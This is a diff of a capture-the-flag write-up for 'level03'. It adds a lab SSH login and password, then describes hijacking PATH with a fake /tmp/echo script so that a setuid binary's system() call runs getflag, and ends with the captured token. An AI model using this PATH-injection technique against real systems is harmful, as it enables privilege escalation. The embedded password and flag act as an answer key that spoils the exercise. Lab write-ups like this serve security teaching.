@@ -1,5 +1,6 @@
 
-we are at `/home/user/level03`
+ssh level03@10.12.100.98 -p 4242
+pwd: kooda2puivaav1idi4f57q8iq
 
 In the home we found a binary file `level03`
 
@@ -28,11 +29,27 @@ if we execute `./level03`, it outputs the msg: `Exploit me`
 strings level03
     /usr/bin/env echo Exploit me
 ```
-       strings - print the strings of printable characters in files.
+tracing the call of the executable either with strings or ltrace ull notice:
+
+`system("/usr/bin/env echo Exploit me")`
+
+u could check [this thread](https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code/8304447) on StackOverflow
+
+Whenever user type some command in shell, it first search that command in the list of directories mentioned in PATH environment variable. {[Quora](https://www.quora.com/How-are-commands-executed-in-Linux)}
 
 
+so on the system function call we can override the behavior of echo to inject our getflag command which is built-in /bin/getflag 
+
+`echo "/bin/getflag" > /tmp/echo && chmod +x /tmp/echo && PATH=/tmp:$PATH`
+
+```
+ echo "echo getflag" >> /tmp/echo
+ chmod 777 /tmp/echo
+ export PATH=/tmp:$PATH
+```
 
 
-
-`return system("/usr/bin/env echo Exploit me");`
-
+```
+ ./level03
+    token : qi0maab88jeaj46qoumi7maus
+ ```
